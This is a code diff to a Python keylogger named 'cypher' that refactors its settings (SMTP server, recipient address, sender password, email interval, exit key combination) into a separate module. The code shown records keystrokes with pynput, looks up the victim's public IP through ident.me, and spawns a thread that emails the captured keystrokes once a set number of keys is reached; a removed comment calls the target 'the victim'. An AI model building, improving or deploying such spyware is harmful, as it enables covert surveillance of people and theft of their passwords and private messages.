@@ -1,24 +1,26 @@
 import logging
 import threading
 import smtplib
-import socket
-import urllib.request
 import sys
 import os
 import os.path
 import shutil
+
 try:
     import win32console, win32gui
     win32_installed = True
 except ModuleNotFoundError:
     win32_installed = False
+
 try:
     from pynput.keyboard import Key, Listener
     pynput_installed = True
 except ModuleNotFoundError:
     pynput_installed = False
+
+from settings import PUBLIC_IP, SMTP_SERVER, TO_ADDR, FROM_ADDR, PASSWORD, EMAIL_INTERVAL, PORT, SUBJECT, EXIT_COMBINATION, CONTENT, USER
 from datetime import datetime
-from os.path import basename, exists
+from os.path import basename
 from email.mime.text import MIMEText
 from email.mime.multipart import MIMEMultipart
 from email.mime.application import MIMEApplication
@@ -28,30 +30,12 @@ logging.basicConfig(filename = "cypher.log", level = logging.INFO,
                     format = LOG_FORMAT, filemode = "w")
 logger = logging.getLogger()
 
-EXIT_COMBINATION = {Key.ctrl_l, Key.f12}        # Press [L CTRL] + [F12] to stop keylogger
-EMAIL_INTERVAL = 100                            # Specify the amount of characters the victim needs to input before email is sent
-PORT = 465                                      # Specify port number (465 recommended)
-SMTP_SERVER = "smtp.example.com"                # Specify SMTP server
-TO_ADDR = "user@domain.com"                     # Specify recipient email address
-FROM_ADDR = "user@domain.com"                   # Specify sender email address
-PASSWORD = "your_password"                      # Enter sender email account password
-HOSTNAME = socket.gethostname()
-USER = os.getlogin()
-FILE_NAME = basename(sys.argv[0].split("\\")[-1])
-SUBJECT = f"{USER}@{HOSTNAME} // {FILE_NAME}"   # Specify email subject
-try:
-    PUBLIC_IP = urllib.request.urlopen('https://ident.me').read().decode('utf8')
+if PUBLIC_IP != None:
     internet_conn = True
     logger.info("Public ip address resolved")
-except urllib.error.URLError:
+else:
     internet_conn = False
-    PUBLIC_IP = None
     logger.warning("https://ident.me could not be reached")
-# Specify email body
-CONTENT = '''
-See keylogs.txt attached.
-
-Sent from {}.'''.format(PUBLIC_IP)
 
 active_keys = set()
 keys_pressed = 0
@@ -151,7 +135,7 @@ def on_press(key):
         else:
             log("\n" + str(key) + "\n")
     
-    if keys_pressed == EMAIL_INTERVAL:
+    if keys_pressed == EMAIL_INTERVAL and EMAIL_INTERVAL > 0:
         logger.info("Interval reached")
         t = threading.Thread(target = send_email)
         t.start()
